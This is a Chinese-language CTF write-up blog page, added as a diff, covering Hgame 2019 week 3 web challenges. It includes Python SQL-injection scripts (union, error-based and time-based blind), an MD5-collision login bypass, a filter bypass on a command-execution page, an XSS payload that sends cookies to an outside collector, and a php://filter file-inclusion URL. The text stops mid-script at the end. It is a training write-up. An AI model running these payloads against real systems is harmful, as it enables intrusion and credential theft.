@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Hgame_week3_web | Altm4nz</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="wp" />
+  
+  
+  
+  
+  <meta name="description" content="sqli-1 Url: http://118.89.111.179:3000/   一个简单的md5验证。 提交正确的code参数后得到提示 sql error。 同时提交一个id参数得到回显。 写一个交互的脚本方便测试 123456789101112131415161718192021222324252627282930# -*- coding:utf-8 -*-# -*- author:alt">
+<meta name="keywords" content="wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hgame_week3_web">
+<meta property="og:url" content="http://altman.vip/2019/02/12/Hgame-week3-web-/index.html">
+<meta property="og:site_name" content="Altm4nz">
+<meta property="og:description" content="sqli-1 Url: http://118.89.111.179:3000/   一个简单的md5验证。 提交正确的code参数后得到提示 sql error。 同时提交一个id参数得到回显。 写一个交互的脚本方便测试 123456789101112131415161718192021222324252627282930# -*- coding:utf-8 -*-# -*- author:alt">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://altman.vip/2019/02/12/Hgame-week3-web-/1.jpg">
+<meta property="og:image" content="http://altman.vip/2019/02/12/Hgame-week3-web-/2.png">
+<meta property="og:updated_time" content="2019-02-15T10:51:32.661Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hgame_week3_web">
+<meta name="twitter:description" content="sqli-1 Url: http://118.89.111.179:3000/   一个简单的md5验证。 提交正确的code参数后得到提示 sql error。 同时提交一个id参数得到回显。 写一个交互的脚本方便测试 123456789101112131415161718192021222324252627282930# -*- coding:utf-8 -*-# -*- author:alt">
+<meta name="twitter:image" content="http://altman.vip/2019/02/12/Hgame-week3-web-/1.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Altm4nz" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/pokemon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+  <link rel="stylesheet" href="/css/fashion.css" >
+  <link rel="stylesheet" href="/css/glyphs.css" >
+
+</head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+
+
+<header id="allheader" class="site-header" role="banner" 
+   >
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="Altm4nz" rel="home"> Altm4nz </a>
+            
+          </h1>
+          
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+
+            <div class="clearfix sf-menu">
+              <ul id="main-nav" class="menu sf-js-enabled sf-arrows"  style="touch-action: pan-y;">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/archives">Archives</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/tags">Tags</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/friend">friend</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+      </div>
+  </div>
+</header>
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-Hgame-week3-web-" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      Hgame_week3_web
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2019/02/12/Hgame-week3-web-/" class="article-date">
+	  <time datetime="2019-02-12T03:08:44.000Z" itemprop="datePublished">February 12, 2019</time>
+	</a>
+
+       
+      
+	<span id="busuanzi_container_page_pv">
+	  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	</span>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="sqli-1"><a href="#sqli-1" class="headerlink" title="sqli-1"></a>sqli-1</h2><ul>
+<li>Url: <a href="http://118.89.111.179:3000/" target="_blank" rel="noopener">http://118.89.111.179:3000/</a> </li>
+</ul>
+<p>一个简单的md5验证。</p>
+<p>提交正确的code参数后得到提示 sql error。</p>
+<p>同时提交一个id参数得到回显。</p>
+<p>写一个交互的脚本方便测试</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># -*- author:altman -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">pay=<span class="string">"'or 1=1#"</span></span><br><span class="line">url=<span class="string">"http://118.89.111.179:3000/"</span></span><br><span class="line">cookie=&#123;</span><br><span class="line">    <span class="string">'PHPSESSID'</span>:<span class="string">'dtguasqnchsgj6fnesd2c63v8n'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcode</span><span class="params">()</span>:</span></span><br><span class="line">    r=requests.get(url=url,cookies=cookie)</span><br><span class="line">    ans=<span class="string">''</span></span><br><span class="line">    code=r.content[<span class="number">35</span>:<span class="number">39</span>]</span><br><span class="line">    code=str(code)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">9999999</span>):</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(str(i)).hexdigest()[<span class="number">0</span>:<span class="number">4</span>] == code:</span><br><span class="line">            ans=str(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql</span><span class="params">(pay)</span>:</span></span><br><span class="line">    code=getcode()</span><br><span class="line">    url1=url+<span class="string">"?code="</span>+code+<span class="string">"&amp;id="</span>+pay</span><br><span class="line">    r = requests.get(url=url1, cookies=cookie)</span><br><span class="line">    <span class="keyword">print</span> r.content</span><br><span class="line"></span><br><span class="line">a=<span class="string">"-1 union select (select column_name from information_schema.columns where table_schema='hgame' and table_name='f1l1l1l1g' limit 0,1)%23"</span></span><br><span class="line">b=<span class="string">"-1 union select f14444444g from f1l1l1l1g%23"</span></span><br><span class="line">sql(b)</span><br></pre></td></tr></table></figure>
+<p>最基础的带回显的注入。</p>
+<h2 id="sqli-2"><a href="#sqli-2" class="headerlink" title="sqli-2"></a>sqli-2</h2><ul>
+<li>url: <a href="http://118.89.111.179:3001/?id=1" target="_blank" rel="noopener">http://118.89.111.179:3001/?id=1</a></li>
+</ul>
+<p>上一题的盲注版本，由于只会告诉你sql语句是否执行，所以bool盲注显然不行。</p>
+<p>可以使用时间盲注，然而时间盲注太浪费时间，我选择报错盲注。</p>
+<p>Payload :<code>1 and if((1=2),exp(999999999),1)#</code></p>
+<p>当if成立时，会执行exp(999999999)，造成报错，显示sql error。</p>
+<p>当if不成立时，则显示sql已执行。</p>
+<p>同样脚本破之。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># -*- author:altman -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">"http://118.89.111.179:3001/"</span></span><br><span class="line">cookie=&#123;</span><br><span class="line">    <span class="string">'PHPSESSID'</span>:<span class="string">'dtguasqnchsgj6fnesd2c63v8n'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcode</span><span class="params">()</span>:</span></span><br><span class="line">    r=requests.get(url=url,cookies=cookie)</span><br><span class="line">    ans=<span class="string">''</span></span><br><span class="line">    code=r.content[<span class="number">79</span>:<span class="number">83</span>]</span><br><span class="line">    code=str(code)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">9999999</span>):</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(str(i)).hexdigest()[<span class="number">0</span>:<span class="number">4</span>] == code:</span><br><span class="line">            ans=str(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql</span><span class="params">(pay)</span>:</span></span><br><span class="line">    code=getcode()</span><br><span class="line">    url1=url+<span class="string">"?code="</span>+code+<span class="string">"&amp;id="</span>+pay</span><br><span class="line">    r = requests.get(url=url1, cookies=cookie)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line">a=<span class="string">"1 and if((1=2),exp(999999999),1)#"</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">999</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.letters+<span class="string">'0123456789'</span>+<span class="string">'_&#123;&#125;'</span>:</span><br><span class="line">        a = <span class="string">"1 and if((ascii(substr((select fL4444Ag from F11111114G limit 0,1),%d,1))=%d),exp(999999999),1)#"</span> %(j,ord(i))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">in</span> sql(a):</span><br><span class="line">            flag+=i</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#hgame</span></span><br><span class="line"><span class="comment">#F11111114G</span></span><br><span class="line"><span class="comment">#fL4444Ag</span></span><br><span class="line"><span class="comment">#hgame&#123;sqli_1s_s0_s0_s0_s0_interesting&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="神器的md5"><a href="#神器的md5" class="headerlink" title="神器的md5"></a>神器的md5</h2><p>简单探测后发现源码备份 <code>.login.php.swp</code></p>
+<p>vim -r 恢复后得到源码，这里贴上php的部分。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if (@$_POST[&apos;username&apos;] and @$_POST[&apos;password&apos;] and @$_POST[&apos;code&apos;])</span><br><span class="line">    &#123;</span><br><span class="line">Press EN$username = (string)$_POST[&apos;username&apos;];</span><br><span class="line">        $password = (string)$_POST[&apos;password&apos;];</span><br><span class="line">        $code     = (string)$_POST[&apos;code&apos;];</span><br><span class="line"></span><br><span class="line">        if (($username == $password ) or ($username == $code)  or ($password == $code)) &#123;</span><br><span class="line">            echo &quot;Your input can&apos;t be the same&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else if ((md5($username) === md5($password)) and (md5($password) === md5($code)))&#123;</span><br><span class="line">            echo &quot;Good&quot;;</span><br><span class="line"></span><br><span class="line">            header(&apos;Location: admin.php&apos;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;pre&gt; Invalid password&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>审计后发现由于对参数进行了强转string，不能用数组什么的绕过。</p>
+<p>需要强行md5碰撞。</p>
+<p>找到了这个项目 <a href="https://github.com/thereal1024/python-md5-collision" target="_blank" rel="noopener">https://github.com/thereal1024/python-md5-collision</a></p>
+<p>可以生成许多个md5相同的文件。</p>
+<p>首先需要安装boost环境  <code>brew install boost</code>   然后 <code>python3 gen_coll_test.py</code>（mac下）</p>
+<p>生成一堆文件out_test_xxx.txt。这些文件的md5值都相同。</p>
+<p>写一个脚本POST数据。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># -*- author:altman -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://118.25.89.91:8080/question/login.php"</span></span><br><span class="line"></span><br><span class="line">username=open(<span class="string">'/Users/a1tm4nz/web/python-md5-collision/out_test_000.txt'</span>,<span class="string">'r'</span>).read()</span><br><span class="line">password=open(<span class="string">'/Users/a1tm4nz/web/python-md5-collision/out_test_001.txt'</span>,<span class="string">'r'</span>).read()</span><br><span class="line">code=open(<span class="string">'/Users/a1tm4nz/web/python-md5-collision/out_test_002.txt'</span>,<span class="string">'r'</span>).read()</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">'username'</span>:username,</span><br><span class="line">    <span class="string">'password'</span>:password,</span><br><span class="line">    <span class="string">'code'</span>:code</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r=requests.post(url=url,data=data)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br><span class="line"><span class="keyword">print</span> r.cookies</span><br></pre></td></tr></table></figure>
+<p>此时已经成功登录了，之后用登陆后的cookie去访问admin.php就进入下一层。</p>
+<p>给了一个shell，我们直接cat admin.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;!-- Matomo --&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">  <span class="keyword">var</span> _paq = window._paq || [];</span><br><span class="line">  <span class="comment">/* tracker methods like "setCustomDimension" should be called before "trackPageView" */</span></span><br><span class="line">  _paq.push([<span class="string">'trackPageView'</span>]);</span><br><span class="line">  _paq.push([<span class="string">'enableLinkTracking'</span>]);</span><br><span class="line">  (<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> u=<span class="string">"//118.25.89.91/piwik/"</span>;</span><br><span class="line">    _paq.push([<span class="string">'setTrackerUrl'</span>, u+<span class="string">'matomo.php'</span>]);</span><br><span class="line">    _paq.push([<span class="string">'setSiteId'</span>, <span class="string">'1'</span>]);</span><br><span class="line">    <span class="keyword">var</span> d=document, g=d.createElement(<span class="string">'script'</span>), s=d.getElementsByTagName(<span class="string">'script'</span>)[<span class="number">0</span>];</span><br><span class="line">    g.type=<span class="string">'text/javascript'</span>; g.async=<span class="keyword">true</span>; g.defer=<span class="keyword">true</span>; g.src=u+<span class="string">'matomo.js'</span>; s.parentNode.insertBefore(g,s);</span><br><span class="line">  &#125;)();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;!-- End Matomo Code --&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">"secret"</span>] === <span class="string">'hgame2019'</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>   </span><br><span class="line">    &lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">    <span class="keyword">Private</span> Terminal   &lt;input type=<span class="string">"text"</span> name=<span class="string">"command"</span>&gt;&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>($_SERVER[<span class="string">'REQUEST_METHOD'</span>] === <span class="string">'POST'</span> &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">        $cmd = (string)$_POST[<span class="string">'command'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;The Command is : $cmd &lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	$cmd = str_replace(<span class="string">"flag"</span>,<span class="string">'none'</span>,$cmd);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Result is :"</span>;system($cmd); <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('Login First')&lt;/script&gt;"</span>;</span><br><span class="line">    header(<span class="string">'Location: login.php'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>有一个简单的替换操作 ，将’flag’替换为’none’。</p>
+<p>直接绕过检测读取flag</p>
+<p><code>cat /&#39;fla&#39;&#39;g&#39;</code></p>
+<h2 id="babyxss"><a href="#babyxss" class="headerlink" title="babyxss"></a>babyxss</h2><p>基础的xss打cookies。</p>
+<p>测试后发现后端采取关键字替换为空的waf策略，我们可以采取双写来绕过。</p>
+<p>payload<code>&lt;script src=[url]&gt;&lt;/scr&lt;/script&gt;ipt&gt;</code></p>
+<p>懒得去vps接请求了，使用了xsspt（<a href="http://www.xsspt.com）来获取cookie。" target="_blank" rel="noopener">www.xsspt.com）来获取cookie。</a></p>
+<p>提交后接收到了flag。</p>
+<p><img src="/2019/02/12/Hgame-week3-web-/1.jpg" alt=""></p>
+<h2 id="基础渗透"><a href="#基础渗透" class="headerlink" title="基础渗透"></a>基础渗透</h2><p>登录后简单测试发现了文件包含</p>
+<p><code>http://111.231.140.29:10080/index.php?action=php://filter/read=convert.base64-encode/resource=login</code></p>
+<p>拿下所有源码审计。</p>
+<p>在functions.php中看到了所有关键函数。</p>
+<p>找到了一个文件上传功能，此时想到上传文件getshell。</p>
+<p>简单审计发现由于上传后的文件是由一个rand_filename函数进行命名的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_filename</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $tmp = `cat /dev/urandom | head -n <span class="number">10</span> | md5sum | head -c <span class="number">15</span>`;</span><br><span class="line">    $sql_query = <span class="string">"select `avatar` from `users` where `avatar`=$tmp"</span>;</span><br><span class="line">    $res = sql_query($sql_query);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        <span class="keyword">return</span> rand_filename();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> $tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们无法预测到文件名。</p>
+<p>需要通过注入找到avatar表中的文件名。所有参数传递时都被加上了addslashes。但是在删除功能处存在一个数字型注入，不需要使用引号闭合，所以addslashes没有起到作用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete_message</span><span class="params">($message_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'token'</span>] === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_SESSION[<span class="string">'groups'</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">            $sql_query = <span class="string">"delete from `messages` where `message_id`=$message_id and `user_id`=$user_id"</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($_SESSION[<span class="string">'groups'</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">            $sql_query = <span class="string">"delete from `messages` where `message_id`=$message_id"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sql_query($sql_query);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在messge_id处进行注入。</p>
+<p>我们先随意上传一张图片，让他生成一个文件名。</p>
+<p>通过python脚本，进行注入得到文件名。</p>
+<p>Ps:注入时需要有留言存在，所以编写脚本时每次注入前先进行留言。</p>
+<p>token会失效，所以每次注入前获取一次最新的token。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://111.231.140.29:10080/index.php?action=delete'</span></span><br><span class="line">url1 = <span class="string">'http://111.231.140.29:10080/messages_api.php?action=delete'</span></span><br><span class="line">url2 = <span class="string">'http://111.231.140.29:10080/messages_api.php?action=add'</span></span><br><span class="line">cook = &#123;</span><br><span class="line">	<span class="string">'PHPSESSID'</span>:<span class="string">'dutuigp1v8psgqs84osftj979d'</span>,</span><br><span class="line">	<span class="string">'user'</span>:<span class="string">'altman77'</span>,</span><br><span class="line">	<span class="string">'groups'</span>:<span class="string">'0'</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">'message_id'</span>:<span class="string">'100 or if((select avatar from users where username like 0x25 limit 1) like 0x25,sleep(5),1)-- 1'</span>,</span><br><span class="line">	<span class="string">'token'</span>:<span class="string">'123'</span></span><br><span class="line">&#125;</span><br><span class="line">data1 = &#123;</span><br><span class="line">	<span class="string">'new_message'</span>:<span class="string">'just a test!!!'</span>,</span><br><span class="line">	<span class="string">'token'</span>:<span class="string">'123'</span></span><br><span class="line">&#125;</span><br><span class="line">head = &#123;</span><br><span class="line">	<span class="string">'Origin'</span>:<span class="string">'http://111.231.140.29:10080'</span>,</span><br><span class="line">	<span class="string">'X-Requested-With'</span>:<span class="string">'XMLHttpRequest'</span>,</span><br><span class="line">	<span class="string">'Referer'</span>:<span class="string">'http://111.231.140.29:10080/index.php?action=message'</span></span><br><span class="line">&#125;</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">print</span> x</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> (<span class="number">33</span>,<span 